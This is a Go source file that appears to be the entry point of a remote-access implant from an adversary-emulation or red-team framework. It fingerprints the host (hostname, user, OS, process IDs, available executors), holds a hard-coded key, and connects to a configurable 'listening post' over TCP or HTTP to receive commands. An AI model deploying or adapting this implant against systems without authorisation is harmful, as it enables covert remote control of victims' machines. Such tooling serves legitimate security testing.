package main

import (
   "fmt"
   "os"
   "os/user"
   "runtime"
   "flag"
   "path/filepath"

   "./util"
   "./output"
   "./sockets"
)

var (
   key = "94699f9970213dd1d4054ca678f1278a"
   contact = "tcp"
   socket = "0.0.0.0:5678"
   http = "http://localhost:8888"
)

func buildProfile(socket string) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()
   platform := runtime.GOOS
   architecture := runtime.GOARCH

	profile := make(map[string]interface{})
	profile["server"] = socket
	profile["host"] = host
	profile["username"] = user.Username
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["pid"] = os.Getpid()
	profile["ppid"] = os.Getppid()
	profile["executors"] = util.DetermineExecutors(platform, architecture)
	profile["exe_name"] = filepath.Base(os.Args[0])
	return profile
}

func main() {
   contact := flag.String("contact", "tcp", "Which contact to use")
   socket := flag.String("socket", "0.0.0.0:5678", "The ip:port of the socket listening post")
   http := flag.String("http", "http://127.0.0.1:8888", "The FQDN of the HTTP listening post")
   inbound := flag.Int("inbound", 6000, "A port to use for inbound connections")
   verbose := flag.Bool("v", false, "Enable verbose output")
   flag.Parse()

   profile := buildProfile(*socket)

   output.SetVerbose(*verbose)
   output.VerbosePrint(fmt.Sprintf("[*] %s outbound socket %s, inbound at %d", *contact, *socket, *inbound))

   coms, _ := sockets.CommunicationChannels[*contact]
   coms.Listen(*socket, *http, *inbound, profile)
}